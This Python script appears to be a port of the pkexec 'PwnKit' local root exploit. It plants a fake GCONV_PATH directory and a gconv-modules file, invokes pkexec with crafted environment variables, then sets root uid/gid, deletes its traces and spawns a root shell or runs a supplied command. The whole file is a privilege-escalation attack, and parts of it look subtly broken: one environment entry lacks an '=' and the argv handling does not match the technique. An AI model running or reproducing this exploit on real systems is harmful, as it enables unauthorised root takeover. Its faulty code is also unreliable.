import os
import sys
import shutil
import errno
import subprocess

def rmrf(path):
    try:
        shutil.rmtree(path)
    except Exception as e:
        print(f"Error deleting {path}: {e}")

def setup_fake_gconv():
    try:
        os.mkdir("GCONV_PATH=.", mode=0o777)
    except FileExistsError:
        pass
    except Exception as e:
        print("Failed to create directory:", e)
        sys.exit(1)

    try:
        open("GCONV_PATH=./.pkexec", "w").close()
    except Exception as e:
        print("Failed to create fake file:", e)
        sys.exit(1)

    try:
        os.mkdir(".pkexec", mode=0o777)
    except FileExistsError:
        pass

    try:
        with open(".pkexec/gconv-modules", "w") as f:
            f.write("module UTF-8// PKEXEC// pkexec 2\n")
    except Exception as e:
        print("Failed to write gconv-modules:", e)
        sys.exit(1)

    try:
        exe_path = os.readlink("/proc/self/exe")
        os.symlink(exe_path, ".pkexec/pkexec.so")
    except Exception as e:
        print("Failed to symlink self:", e)
        sys.exit(1)

def launch_exploit(cmd=None):
    env = [
        ".pkexec",
        "PATH=GCONV_PATH=.",
        "CHARSET=pkexec",
        "SHELL=pkexec"
    ]
    if cmd:
        env.append(f"CMD={cmd}")

    try:
        subprocess.run(["pkexec"], env=dict(os.environ, **dict(e.split("=", 1) for e in env)))
    except Exception as e:
        print("Exploit failed:", e)

def gconv_init_simulated():
    cmd = os.getenv("CMD")
    os.setresuid(0, 0, 0)
    os.setresgid(0, 0, 0)

    rmrf("GCONV_PATH=.")
    rmrf(".pkexec")

    if cmd:
        os.execve("/bin/sh", ["/bin/sh", "-c", cmd], os.environ)
    else:
        try:
            os.execve("/bin/bash", ["-i"], os.environ)
        except FileNotFoundError:
            os.execve("/bin/sh", ["/bin/sh"], os.environ)

def main():
    if os.geteuid() == 0:
        print("[+] Root access! Launching shell...")
        gconv_init_simulated()
    else:
        setup_fake_gconv()
        cmd = sys.argv[1] if len(sys.argv) > 1 else None
        launch_exploit(cmd)

if __name__ == "__main__":
    main()
